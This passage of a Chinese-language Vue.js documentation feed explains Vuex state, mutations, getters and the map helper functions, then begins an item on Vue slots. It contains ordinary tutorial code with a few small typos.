</span></span><span class="line"><span class="cl">  <span class="nx">demoMutation</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span> <span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* demoMutation的处理逻辑... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>state</code>即对应Store配置中的<code>state</code>配置对象（相当于<code>$store.state</code>）。每一个Mutation都会接收到这个<code>state</code>对象。通过<code>state</code>对象，Mutation可以获取State中的状态数据，并对状态数据进行编辑。</p>
<p>与Action不同，Mutation通常是作为状态数据处理的角色存在。Mutation可以直接修改State中的数据；而Action通常不修改State中的数据，Action一般只是读取State中的数据。</p>
<blockquote>
<p>Action不用作修改数据还有一个原因，如果在Action中修改State中的数据，Vue.js devtools并不能捕获到这些修改。即使在Action对State的修改能生效，也不建议在Action中对State进行修改，在Actions中，应该将State（<code>context.$state</code>）视为只读的。</p>
</blockquote>
<p>一般情况下（官方给的示意图中），Store对数据的处理流程是：<code>$store.dispatch</code> $\Rightarrow$ <code>$store.commit</code>。实际上，对一些简单的操作，不需要对传递的数据进行校验或处理的情况下，可以在组件实例中直接调用<code>$store.commit</code>将数据提交给Mutation处理。</p>
<p><code>$store.commit()</code>在调用时可以仅传递一个参数，也就是<code>mutationName</code>。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;plusOne&#39;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="state" data-numberify>state<a class="anchor ms-1" href="#state"></a></h2>
<p>在组件中读取State中的数据，可以通过<code>this.$store.state.dataName</code>的形式读取（<code>dataName</code>指要读取的数据）。需要注意的是，在组件实例中不要修改State中的数据。也就是说，在组件实例中应该将<code>this.$store.state</code>视为只读。</p>
<p>例如在Store的<code>state</code>配置项中定义一个状态数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">siteTitle</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="c1">// 网站的标题
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>在组件实例中获取<code>state</code>中的数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">siteTitle</span>
</span></span></code></pre></div><p>在组件实例中推荐使用<code>computed</code>来获取<code>state</code>中的数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">siteTitle</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">siteTitle</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>也可以通过<code>computed</code>的Setter来修改<code>state</code>中的数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">siteTitle</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">siteTitle</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">set</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;SET_SITE_TITLE&#39;</span><span class="p">,</span> <span class="nx">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">SET_SITE_TITLE</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span> <span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">state</span><span class="p">.</span><span class="nx">siteTitle</span> <span class="o">=</span> <span class="nx">payload</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>接着，就可以在组件实例中，像使用一般的数据一样，对<code>siteTitle</code>进行各种操作。</p>
<hr>
<h2 id="getters" data-numberify>getters<a class="anchor ms-1" href="#getters"></a></h2>
<p><code>$store.getters</code>就像是一个全局的<code>computed</code>，可以在获取State中的数据之前，对数据进行一些处理。但与<code>computed</code>不同的是，<code>getters</code>只能用于获取，不能用于修改数据。</p>
<p>在Store的<code>getters</code>配置中，每个<code>getter</code>以函数的形式被定义，且每个<code>getter</code>接收一个<code>state</code>参数。这个<code>state</code>参数用于获取State中的数据。</p>
<p>每个<code>getter</code>都有一个唯一的名称，并且就像<code>computed</code>一样，在Vue实例中使用<code>this.$store.getterName</code>来获取相应的<code>getter</code>，<code>getterName</code>与<code>getter</code>定义时的函数名称相同。<code>getter</code>同样也是使用返回值来确定值。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getters</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">demoGetter</span><span class="p">(</span><span class="nx">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* demoGetter 的处理逻辑... */</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="cm">/* demoGetter 的值 */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>例如要获取一个转为大写的<code>siteTitle</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getters</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">siteTitleUpperCase</span><span class="p">(</span><span class="nx">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">state</span><span class="p">.</span><span class="nx">siteTitle</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>在组件实例中获取该值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">gettets</span><span class="p">.</span><span class="nx">siteTitleUpperCase</span>
</span></span></code></pre></div><p>同样可以使用<code>computed</code>来读取该值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">siteTitleUpperCase</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">gettets</span><span class="p">.</span><span class="nx">siteTitleUpperCase</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h1 id="vuex-映射" data-numberify>Vuex 映射<a class="anchor ms-1" href="#vuex-映射"></a></h1>
<p>在组件实例中，使用Store中的<code>state</code>和<code>getter</code>时，配合<code>computed</code>可以使代码更加精简。而Vuex原型正好提供了一些辅助的API，可以在组件实例中快速地为<code>state</code>和<code>getters</code>中的数据创建对应的<code>computed</code>。</p>
<ul>
<li><code>mapState()</code></li>
<li><code>mapGetters()</code></li>
<li><code>mapMutations()</code></li>
<li><code>mapActions()</code></li>
</ul>
<p>在使用这些辅助函数之前，需要先引入。这些辅助函数的引入方法都是相同的，下面进行例举了辅助函数的引入方式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">mapState</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span> <span class="c1">// 引入 mapState
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">mapState</span><span class="p">,</span> <span class="nx">mapGetters</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span> <span class="c1">// 引入 mapState 和 mapGetters
</span></span></span></code></pre></div><h2 id="mapstate" data-numberify>mapState<a class="anchor ms-1" href="#mapstate"></a></h2>
<p><code>mapState()</code>可以将State中的数据映射到组件实例中的<code>computed</code>中。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="nx">mapState</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr1</span><span class="o">:</span> <span class="s1">&#39;stateAttr1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr2</span><span class="o">:</span> <span class="s1">&#39;stateAttr2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr3</span><span class="o">:</span> <span class="s1">&#39;stateAttr3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}),</span>
</span></span></code></pre></div><p>或者使用对象扩展运算符：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span><span class="nx">mapState</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computedAttr1</span><span class="o">:</span> <span class="s1">&#39;stateAttr1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computedAttr2</span><span class="o">:</span> <span class="s1">&#39;stateAttr2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computedAttr3</span><span class="o">:</span> <span class="s1">&#39;stateAttr3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">}),</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>上方所示的两个<code>mapState()</code>相当于在<code>computed</code>中进行如下定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr1</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr1</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr2</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr2</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computedAttr3</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr3</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>也就是说，<code>mapState()</code>返回的是一个类似于<code>computed</code>配置对象的对象。这个对象中的每个属性都是函数类型，相当于一个个设置了Setter的<code>computed</code>属性。</p>
<p>使用<code>mapState()</code>生成的<code>computed</code>被称为<code>vuex bindings</code>（可以在Vue开发者工具中查看）。</p>
<p><code>mapState()</code>可以传入两种类型的参数：</p>
<ul>
<li>
<p>一种就是如上所示的<code>Object</code>类型参数。</p>
<p>传入的对象中，其每个属性的<code>key</code>是作为实例中的<code>computed</code>属性名称，每个属性的<code>value</code>以<code>String</code>类型的形式指定了State中某个属性的名称。</p>
<p>该方式通过传入对象中的每个属性的<code>value</code>指定State中的属性，然后以每个属性的<code>key</code>作为它们的<code>computed</code>属性来生成<code>vuex bindings</code>。</p>
</li>
<li>
<p>另一种方式就是传入字符串数组类型的参数。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">mapState</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;stateAttr1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;stateAttr2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;stateAttr3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">]),</span>
</span></span></code></pre></div><p>这种方式通过字符串数组指定一系列要作为<code>computed</code>（<code>vuex binding</code>）属性使用的State属性。这种方式可以直接使用对应State属性的名称来使用这些<code>vuex binding</code>属性。</p>
<p>上方<code>mapState()</code>相当于在<code>computed</code>中配置了以下内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">stateAttr1</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr1</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="nx">stateAttr2</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr2</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="nx">stateAttr3</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">stateAttr3</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="mapgetters" data-numberify>mapGetters<a class="anchor ms-1" href="#mapgetters"></a></h2>
<p><code>mapGetters()</code>可以将<code>getters</code>中的数据映射到组件实例中的<code>computed</code>中。生成的属性同样被称为<code>vuex bindings</code>。</p>
<p><code>mapGetters()</code>的用法和<code>mapState()</code>几乎相同，它们都可以传入两种类型的参数，并且返回值也是一个属性都为函数类型的对象。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">mapGetters</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr1</span><span class="o">:</span> <span class="s1">&#39;gettersAttr1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr2</span><span class="o">:</span> <span class="s1">&#39;gettersAttr2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr3</span><span class="o">:</span> <span class="s1">&#39;gettersAttr3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">mapGetters</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;gettersAttr1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;gettersAttr2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;gettersAttr3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span></code></pre></div><p>上述两种使用方式，都是相当于在<code>computed</code>进行如下配置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr1</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">getters</span><span class="p">.</span><span class="nx">gettersAttr1</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr2</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">getters</span><span class="p">.</span><span class="nx">gettersAttr2</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gettersAttr3</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">getters</span><span class="p">.</span><span class="nx">gettersAttr3</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="mapmutations" data-numberify>mapMutations<a class="anchor ms-1" href="#mapmutations"></a></h2>
<p><code>mapMutations()</code>用于在<code>methods</code>中快速生成提交（<code>commit</code>）对应Mutations事件的方法。<code>mapMutations()</code>同样拥有两种形参类型。</p>
<p><code>mapMutations()</code>作用于<code>methods</code>，但是用法基本上与<code>mapState()</code>和<code>mapGetters()</code>相同。并且<code>mapMutations()</code>传入的也是一个属性为<code>function</code>类型的对象。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="nx">mapMutations</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">increment</span><span class="o">:</span> <span class="s1">&#39;INCREMENT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">decrement</span><span class="o">:</span> <span class="s1">&#39;DECREMENT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}),</span>
</span></span></code></pre></div><p>相当于在<code>methods</code>中进行如下配置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">increment</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;INCREMENT&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">decrement</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;DECREMENT&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>所以在调用或者绑定事件时，需要以<code>increment()</code>或<code>increment(value)</code>的形式。否则，以<code>increment</code>（如<code>@click=&quot;increment&quot;</code>）的形式绑定事件，传入的<code>value</code>参数就是当前绑定事件的对象（可能会造成数据错误）。</p>
<p><code>mapMutations()</code>数组参数写法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="nx">mapMutations</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;INCREMENT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;DECREMENT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]),</span>
</span></span></code></pre></div><p>相当于：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">INCREMENT</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;INCREMENT&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">DECREMENT</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;DECREMENT&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="mapactions" data-numberify>mapActions<a class="anchor ms-1" href="#mapactions"></a></h2>
<p><code>mapActions()</code>用于在<code>methods</code>中快速生成分发（<code>dispatch</code>）对应Action的方法。</p>
<p><code>mapMutations()</code>的用法基本上与<code>mapMutations()</code>相同。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="nx">mapActions</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">increment</span><span class="o">:</span> <span class="s1">&#39;increment&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">decrement</span><span class="err">：</span><span class="s1">&#39;decrement&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}),</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="nx">mapActions</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;increment&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;decrement&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]),</span>
</span></span></code></pre></div><p>上述两种方式相当于：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">increment</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="s1">&#39;increment&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">decrement</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="s1">&#39;decrement&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>同样使用<code>increment()</code>或<code>increment(value)</code>的形式调用或绑定事件。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 插槽 Slots</title>
      <link>/docs/vue/components/slots/</link>
      <pubDate>Fri, 22 Sep 2023 04:25:29 +0000</pubDate>
      
      <guid>/docs/vue/components/slots/</guid>
      <description><![CDATA[Vue插槽（Slots）用于向组件传递一些模板片段，让子组件在它们的组件中渲染这些片段。插槽也是属于一种父组件到子组件的组件间通行的方式。 V]]></description>
      <content:encoded><![CDATA[<p>Vue插槽（Slots）用于向组件传递一些模板片段，让子组件在它们的组件中渲染这些片段。插槽也是属于一种父组件到子组件的组件间通行的方式。</p>
<p>Vue插槽有以下3种类型：</p>
<ul>
<li>默认插槽。</li>
<li>具名插槽。</li>
<li>作用域插槽。</li>
</ul>
<hr>
<h1 id="默认插槽" data-numberify>默认插槽<a class="anchor ms-1" href="#默认插槽"></a></h1>
<p>使用默认插槽时，只需在子组件模板中，将要从外部传入的模板内容，使用<code>&lt;slot&gt;</code>进行占位即可。</p>
<p>例如有一个名为<code>display-frame</code>的组件，其模板内容如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;display-frame&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>{{title}}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 默认插槽，等待组件的使用者进行填充 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    默认插槽内容。使用者没有传递结构时，会显示。
